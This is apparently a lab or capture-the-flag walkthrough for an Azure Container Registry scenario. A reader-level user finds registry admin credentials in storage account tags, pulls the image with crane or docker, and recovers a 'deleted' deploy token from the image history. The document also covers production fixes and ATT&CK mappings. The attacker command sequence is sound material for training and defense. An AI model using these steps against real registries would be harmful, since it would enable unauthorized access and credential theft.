# ACR Image Secrets — Leaked Admin Creds → Secrets Baked Into an Image

**Provider:** Azure | **Category:** Containers / Secrets

## Scenario

A team runs a **private Azure Container Registry (ACR)** with the **admin account
enabled**. For convenience, someone tagged a "CI/CD artifact cache" storage
account with the registry's admin username and password — so those powerful
static credentials are now readable by anyone with **Reader** on the resource
group.

The application image pushed to that registry was built carelessly: a secret was
embedded at build time and then "removed" in a later layer. Deleting a file in a
later Dockerfile step does **not** remove it from the image — every layer is
retained and ships with the image.

Unlike the plaintext-env-var scenarios (where the secret sits in the **ARM
control plane** and you just `az ... show` it), here you must actually **pull and
dissect a container image**.

## Attack Path

```
[Attacker] Azure AD user (Reader on resource group)
    |
    v
read resource tags  -->  ACR admin username + password (leaked on the storage account)
    |
    v
authenticate + pull the image (crane, or docker)
    |
    +--> flattened filesystem        -->  /app/config/app.config  (DECOY: rotated token)
    |
    v
image history / earlier layer       -->  "deleted" file  -->  DEPLOY_TOKEN = flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — Discover the registry and the leaked credentials

```bash
RESOURCE_GROUP="<resource_group_name>"

# Enumerate the resource group — note the container registry and the storage account.
az resource list --resource-group "${RESOURCE_GROUP}" -o table

# A plain Reader cannot run `az acr credential show` (that needs listCredentials).
# But the credentials were left in the storage account's tags:
az resource show \
  --resource-group "${RESOURCE_GROUP}" \
  --name "<leak_storage_account>" \
  --resource-type Microsoft.Storage/storageAccounts \
  --query tags
```

You'll get the registry login server, `ci-registry-username`, and
`ci-registry-password`.

### Step 3 — Authenticate to the registry and pull the image

The Cumulonimbus container has **no Docker daemon**, so use `crane` (a
single-binary registry client, pre-installed in the image). Authenticate with the
leaked admin credentials:

```bash
LOGIN_SERVER=<login-server>          # e.g. cnacr....azurecr.io
crane auth login $LOGIN_SERVER -u <ci-registry-username> -p <ci-registry-password>
IMG=$LOGIN_SERVER/cumulonimbus/app:latest
```

### Step 4 — Find the decoy (the file that survives in the filesystem)

```bash
crane export $IMG - | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
```

That's `legacy_deploy_token` from `/app/config/app.config` — an **old, rotated**
value (a decoy). The real token was removed in a later build step.

### Step 5 — Recover the real secret from the deleted layer

The credential was written to `/root/.deploy_token` in one layer and `rm`'d in
the next. It's gone from the flattened filesystem, but it still lives in the
image's **history** (the command that wrote it) and in the earlier layer's blob:

```bash
crane config $IMG | grep -ao 'CUMULONIMBUS{[^}]*}' | sort -u
```

The `DEPLOY_TOKEN` value is the flag.

#### With Docker instead (on a host that has a daemon)

| Purpose | crane (in-container) | Docker |
|---|---|---|
| Authenticate | `crane auth login -u <user> -p <pass>` | `docker login <login-server> -u <user> -p <pass>` |
| Get the image | (implicit) | `docker pull $IMG` |
| Decoy (flattened filesystem) | `crane export $IMG -` | `docker run --rm -it $IMG sh` → `cat /app/config/app.config` |
| Real flag (image history) | `crane config $IMG` | `docker history --no-trunc $IMG` |
| Pull the layers apart | per-layer `crane blob` | `docker save $IMG -o image.tar && tar -xf image.tar -C image` then `grep -rao 'CUMULONIMBUS{[^}]*}' image/` |

#### What the image history actually is

A Docker/OCI image is a stack of read-only layers plus a config JSON that
includes a `history` array — one entry per build step, recording the instruction
that produced it (`created_by`). For a shell-form `RUN`, `created_by` is the
literal command that executed:

```
/bin/sh -c printf 'DEPLOY_TOKEN=CUMULONIMBUS{...}' > /root/.deploy_token
```

`crane config` / `docker history` just print that array. This is why an inline
secret in a `RUN` leaks even after the file is removed: a later `rm` deletes the
*file* from the final filesystem, but the *command text* (with the secret) is
permanently recorded in the history — and the file itself still exists in the
earlier layer's blob. Deleting a secret in a Dockerfile does **not** scrub it
from the image.

## How to Fix in Production

1. **Disable the ACR admin account** (`admin_enabled = false`) and use Azure AD /
   token-based, least-privilege access (e.g. `AcrPull` scoped to a managed
   identity).
2. **Never store registry credentials in resource tags** (or anywhere a Reader
   can see). Tags are not a secret store.
3. **Don't bake secrets into images.** Inject them at runtime (Key Vault, mounted
   secrets) and use multi-stage builds / `--secret` mounts so nothing lands in a
   layer. Deleting a file in a later step does not remove it from earlier layers.
4. **Scan images** for secrets in CI (trivy, trufflehog, `docker history`
   review) before they reach a registry.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Implant Internal Image | [T1525](https://attack.mitre.org/techniques/T1525/) |
| Container and Resource Discovery | [T1613](https://attack.mitre.org/techniques/T1613/) |
